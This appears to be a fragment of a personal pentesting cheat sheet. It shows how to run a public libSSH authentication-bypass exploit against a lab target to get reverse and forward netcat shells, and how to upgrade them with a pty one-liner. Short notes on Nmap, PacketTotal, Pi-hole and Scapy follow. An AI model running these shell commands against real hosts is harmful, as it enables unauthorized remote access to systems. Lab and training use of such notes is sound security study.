```
Anaconda (non-admin) prompt:
```
conda create -n boofuzz python=2.7 -y
conda activate boofuzz
cd Documents

#### Example usage, using github.com/blacknbunny/libSSH-Authentication-Bypass/blob/master/libsshauthbypass.py:
TO GET REVERSE SHELL WITH THE VULNSERVER FOR TESTING SSHBYPASSAUTH (found at https://pentesterlab.com/exercises/cve-2018-10933):
```
python libsshauthbypass.py --host <VULNERABLE IP> -c "nc <YOUR HOST IP> <PORT> -e /bin/sh"
ncat -vlp <PORT>
```
TO GET FORWARD SHELL WITH THE VULNSERVER FOR TESTING SSHBYPASSAUTH (found at https://pentesterlab.com/exercises/cve-2018-10933):
```
python libsshauthbypass.py --host <VULNERABLE IP> -c "nc -vlp <PORT> -e /bin/sh"
ncat <VULNERABLE IP> <PORT>
```
IF YOU HAVE BASH AND PYTHON ON HOST, CONVERT FUGLY SHELL TO NICE SHELL WITH:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Nmap: https://nmap.org/book/man-briefoptions.html (scanning ports & networks) <br>

### PacketTotal: https://packettotal.com/ (online packet analysis) <br>
- Upload pcap, it'll show the data nicely analyzed for you. Can export as csv and txt.

### Pihole: https://pi-hole.net/ (block all the ads) <br>
DNS Sinkhole for ads

### Reverse Shell: (Also see NetCat writeup) <br>
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Scapy: https://github.com/secdev/scapy (create packets to attempt to annoy the system into responding) <br>
``` 
sr1(ARP(pdst="xxx.xxx.xxx.xxx")) #Replace the x's with the IP
```

- Preinstalled on Kali
